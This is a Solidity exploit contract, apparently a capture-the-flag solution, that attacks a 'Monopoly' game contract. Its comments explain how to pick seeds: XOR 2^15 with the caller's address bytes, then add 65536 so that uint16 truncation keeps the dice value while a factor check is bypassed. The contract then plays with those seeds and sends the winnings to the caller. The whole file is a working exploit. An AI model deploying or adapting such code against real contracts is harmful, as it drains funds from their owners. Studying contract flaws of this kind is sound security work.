pragma solidity 0.8.7;

import "./Monopoly.sol";

contract MonopolyExploiter {
    constructor(Monopoly instance) payable {
        require(msg.value >= 0.25 ether, "At least 0.25 ETH is required");
        uint32 _seed1;
        uint32 _seed2;

        /*
        last / 4 + 1 = 2^15 * 2^15
        Try it yourself at wolframalpha.com or factordb.com
        Therefore, just find seed that produces dice = 2^15 by XOR first 2 bytes of your address

        from the line
        dice = uint16(_seed) ^ uint16(bytes2(bytes20(address(tx.origin))));
        2^15 = x ^ y, where:
        x = seed
        y = first 2 bytes of your address

        an XOR property: Self-inverse (A XOR A = 0)
        just add ` ^ y ` to the both side of the equation
        2^15 ^ y = x ^ y ^ y
        2^15 ^ y = x ^ 0
        2^15 ^ y = x
        Yes, you can find the right seed by just XOR the 2^15 with the first 2 bytes of your address
        */

        _seed1 = 2**15 ^ uint16(bytes2(bytes20(tx.origin))); // 2^15 = _seed1 ^ (first 2 bytes of tx.origin)

        /*
        FACTOR % seed == 0 when seed = [1,7,49]
        To make sure that condition always false just add more 65536
        seed is uint32 while dice is uint16 so in the end dice will still be 2^15; thanks to type conversion mystery :D
        Exmaple: FACTOR % 7 == 0, but FACTOR % 65543 != 0. 65543 is just 7+65536
        So, uint32(65543) = uint16(7) :)
        */
        _seed1 += 65536;
        _seed2 = _seed1 + 65536; // require(_seed1 != _seed2), just add another 65536 then!!

        instance.play{value: msg.value}(_seed1, _seed2);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }
}